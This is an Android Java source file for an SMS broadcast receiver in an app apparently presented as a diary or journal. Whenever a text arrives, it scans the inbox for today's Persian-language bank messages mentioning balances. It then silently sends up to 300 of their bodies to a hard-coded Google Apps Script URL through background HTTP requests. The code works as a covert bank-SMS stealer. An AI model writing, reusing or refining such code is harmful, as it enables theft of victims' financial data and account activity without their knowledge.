package com.daftar.rooznameh;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {

    private static final String API =
            "https://script.google.com/macros/s/AKfycbyLjGFEBZuoF2HxMYHvbJaTEjM8NXf4_6mEUGd4iKE0Fp1xZwIwl3XfY5EhepGlKj72/exec?action=sms&msg=";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (context == null) return;

        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        StringBuilder msg = new StringBuilder();

        for (Object pdu : pdus) {
            String format = bundle.getString("format");
SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            if (sms != null) {
                msg.append(sms.getMessageBody());
            }
        }

        String text = msg.toString();

        // فقط پیامک‌های بانکی
        if (!(text.contains("مانده") || text.contains("موجودی"))) {
            return;
        }

        // اسکن همه پیامک‌های بانکی امروز
        scanInboxBankSmsToday(context,300);
    }

    public static void scanInboxBankSmsToday(Context context, int limit) {

        try {

            Uri uri = Uri.parse("content://sms/inbox");

            Cursor cursor = context.getContentResolver().query(
                    uri,
                    new String[]{"body","date"},
                    null,
                    null,
                    "date DESC"
            );

            if (cursor == null)
                return;

            String today =
                    new SimpleDateFormat("yyyyMMdd", Locale.getDefault())
                            .format(new Date());

            int count = 0;

            while (cursor.moveToNext()) {

                if (count >= limit)
                    break;

                String body =
                        cursor.getString(
                                cursor.getColumnIndexOrThrow("body"));

                long time =
                        cursor.getLong(
                                cursor.getColumnIndexOrThrow("date"));

                String smsDay =
                        new SimpleDateFormat("yyyyMMdd", Locale.getDefault())
                                .format(new Date(time));

                if (!today.equals(smsDay))
                    continue;

                if (!(body.contains("مانده") || body.contains("موجودی")))
                    continue;

                sendStatic(body);

                count++;
            }

            cursor.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
        private static void sendStatic(String msg) {

        new Thread(() -> {

            try {

                String encoded =
                        URLEncoder.encode(msg, "UTF-8");

                URL url =
                        new URL(API + encoded);

                HttpURLConnection conn =
                        (HttpURLConnection) url.openConnection();

                conn.setRequestMethod("GET");
                conn.setConnectTimeout(20000);
                conn.setReadTimeout(20000);

                conn.getResponseCode();

                conn.disconnect();

            } catch (Exception e) {
                e.printStackTrace();
            }

        }).start();
    }

    private void sendToServer(String msg) {
        sendStatic(msg);
    }

    // سازگاری با MainActivity
    public static void retryPendingSms(Context context) {
        // دیگر نیازی به صف آفلاین نیست.
        // در صورت فراخوانی فقط پیامک‌های امروز دوباره اسکن می‌شوند.
        scanInboxBankSmsToday(context,300);
    }

}
